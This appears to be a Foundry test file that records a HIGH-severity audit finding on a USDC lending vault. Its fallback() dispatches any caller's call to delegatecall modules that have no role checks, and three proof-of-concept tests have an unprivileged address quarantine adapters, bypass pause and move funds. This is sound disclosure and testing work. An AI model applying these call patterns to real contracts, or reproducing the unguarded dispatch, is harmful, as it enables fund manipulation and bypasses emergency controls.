// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING: Missing access control on delegatecall-module externals reachable
 *          via UsdcMultiLendingVault.fallback().
 * SEVERITY: HIGH
 *
 * StrategyAdapterOpsModule and StrategyScoringModule expose several `external`
 * functions guarded only by:
 *
 *     modifier onlyDelegateCall() {
 *         require(address(this) != _self, "DIRECT_CALL_FORBIDDEN");
 *         _;
 *     }
 *
 * This modifier only rejects a call made *directly* to the standalone module
 * contract (where address(this) == the module's own address). It does NOT
 * check msg.sender, KEEPER_ROLE, PARAM_ROLE, or any other authorization.
 *
 * UsdcMultiLendingVault.fallback() (UsdcLendingStrategy.sol:1022) delegatecalls
 * *any* unrecognized selector to a fixed chain of modules
 * [scoringModule, gate, plan, adapterOpsModule, params, settings] for ANY
 * caller, with no access check before dispatch. Once the call lands inside
 * one of these modules via delegatecall, `address(this) == vault`, so
 * `onlyDelegateCall` is satisfied — the function runs exactly as if it had
 * been called by the strategy's own internal logic, but with an attacker-
 * chosen msg.sender and arguments.
 *
 * Confirmed unprotected external entry points reachable this way (no selector
 * collision exists earlier in the fallback chain — verified by grep across
 * StrategyScoringModule / StrategyRebalanceGateModule / StrategyRebalancePlanModule):
 *
 *   - StrategyAdapterOpsModule.recordAdapterFailure(address)      [state-changing]
 *   - StrategyAdapterOpsModule.recordAdapterSuccess(address)      [state-changing]
 *   - StrategyAdapterOpsModule.safeAdapterDeposit(address,uint256)[moves real funds]
 *   - StrategyAdapterOpsModule.adapterDeposit(address,uint256)    [moves real funds]
 *   - StrategyAdapterOpsModule.recordWithdrawGas(address,uint256) [state-changing]
 *   - StrategyScoringModule.deployIdleToAdapters(uint256,bool)    [moves real funds,
 *       bypasses every guard on the intended deployIdle() entry point: KEEPER_ROLE,
 *       whenNotPaused, depositsDisabled check, _degradedGuard(), cooldown, dust
 *       threshold]
 *
 * The 3 PoCs below demonstrate concrete, independent bad outcomes from this
 * single root cause, all executed by an address holding ZERO roles on the
 * vault (no KEEPER_ROLE, no PARAM_ROLE, no DEFAULT_ADMIN_ROLE, no CORE_ROLE).
 */

import { Test, console2 } from "forge-std/Test.sol";
import {
    UsdcMultiLendingVaultTestBase,
    MockUSDC,
    MockLendingAdapter
} from "../UsdcMultiLendingVault.t.sol";

contract AccessControlBypass_PoC is UsdcMultiLendingVaultTestBase {
    address attacker = address(0xA11CE);

    function setUp() public override {
        super.setUp();
        _addAndEnableAdapter(adapter1);
    }

    /// @notice PoC A — permissionless, zero-cost forced quarantine of a
    ///         perfectly healthy adapter.
    /// @dev    Quarantined adapters are excluded from new allocation
    ///         (I-ADAPTER-05) and from `_countEligibleAdapters()`. Quarantining
    ///         enough adapters this way trips the MAJORITY_INELIGIBLE
    ///         DegradedMode trigger (StrategyScoringModule._isDegradedMode),
    ///         freezing new capital deployment strategy-wide — all with no
    ///         privileges and no real adapter failures.
    function test_POC_A_permissionless_forced_quarantine() public {
        assertFalse(vault.quarantined(address(adapter1)), "sanity: healthy adapter starts un-quarantined");
        assertFalse(vault.hasRole(KEEPER_ROLE, attacker), "sanity: attacker has no KEEPER_ROLE");
        assertFalse(vault.hasRole(PARAM_ROLE, attacker), "sanity: attacker has no PARAM_ROLE");
        assertFalse(vault.hasRole(DEFAULT_ADMIN_ROLE, attacker), "sanity: attacker has no ADMIN_ROLE");

        uint8 threshold = vault.adapterQuarantineThreshold();
        vm.startPrank(attacker);
        for (uint8 i = 0; i < threshold; i++) {
            (bool ok, ) = address(vault).call(
                abi.encodeWithSignature("recordAdapterFailure(address)", address(adapter1))
            );
            require(ok, "recordAdapterFailure call unexpectedly failed");
        }
        vm.stopPrank();

        assertTrue(
            vault.quarantined(address(adapter1)),
            "VULNERABLE: unprivileged attacker quarantined a healthy adapter via StrategyAdapterOpsModule.recordAdapterFailure"
        );
    }

    /// @notice PoC B — permissionless deployment of idle capital that bypasses
    ///         `pause()`, the exact circuit breaker governance relies on to
    ///         freeze all new capital exposure during an incident.
    function test_POC_B_permissionless_deployIdle_bypasses_pause() public {
        uint256 idleAmt = 100e6;
        usdc.mint(address(vault), idleAmt);

        vm.prank(admin);
        vault.pause();
        assertTrue(vault.paused(), "sanity: vault is paused (emergency circuit breaker engaged)");

        // The *intended* entry point correctly respects the pause.
        vm.prank(keeper);
        (bool viaIntended, ) = address(vault).call(abi.encodeWithSignature("deployIdle()"));
        assertFalse(viaIntended, "sanity: legitimate deployIdle() is blocked while paused, as designed");

        uint256 posBefore = vault.positionAssets(address(adapter1));

        // The unguarded internal entry point is directly reachable and ignores
        // the pause entirely.
        vm.prank(attacker);
        (bool ok, ) = address(vault).call(
            abi.encodeWithSignature("deployIdleToAdapters(uint256,bool)", idleAmt, true)
        );
        require(ok, "deployIdleToAdapters call unexpectedly failed");

        uint256 posAfter = vault.positionAssets(address(adapter1));
        assertGt(
            posAfter, posBefore,
            "VULNERABLE: unprivileged attacker deployed vault capital into an adapter while the vault was paused"
        );
    }

    /// @notice PoC C — permissionless direct fund movement into an adapter
    ///         that corrupts the strategy's own bookkeeping (`positionAssets`),
    ///         bypassing every allocation cap/gate in the same motion.
    /// @dev    `safeAdapterDeposit` moves real USDC to the adapter but,
    ///         unlike the legitimate `_deployIdleToAdapters` caller, never
    ///         increments `positionAssets[adapter]` itself (that bookkeeping
    ///         update lives one call frame up, in code paths this entry point
    ///         skips entirely). NAV/allocation accounting silently understates
    ///         the adapter's real exposure until a governance-triggered sync.
    function test_POC_C_permissionless_safeAdapterDeposit_desyncs_accounting() public {
        uint256 amt = 50e6;
        usdc.mint(address(vault), amt);

        uint256 posBefore = vault.positionAssets(address(adapter1));
        uint256 adapterBalBefore = adapter1.deposited();

        vm.prank(attacker);
        (bool ok, bytes memory ret) = address(vault).call(
            abi.encodeWithSignature("safeAdapterDeposit(address,uint256)", address(adapter1), amt)
        );
        require(ok, "safeAdapterDeposit call unexpectedly failed");
        assertTrue(abi.decode(ret, (bool)), "sanity: adapter deposit reported success");

        assertEq(
            adapter1.deposited(), adapterBalBefore + amt,
            "sanity: the adapter really received and recorded the funds"
        );
        assertEq(
            vault.positionAssets(address(adapter1)), posBefore,
            "VULNERABLE: real funds moved into the adapter but vault bookkeeping (positionAssets) was never updated -> NAV/cap accounting desync, all caps/gates bypassed"
        );
    }
}
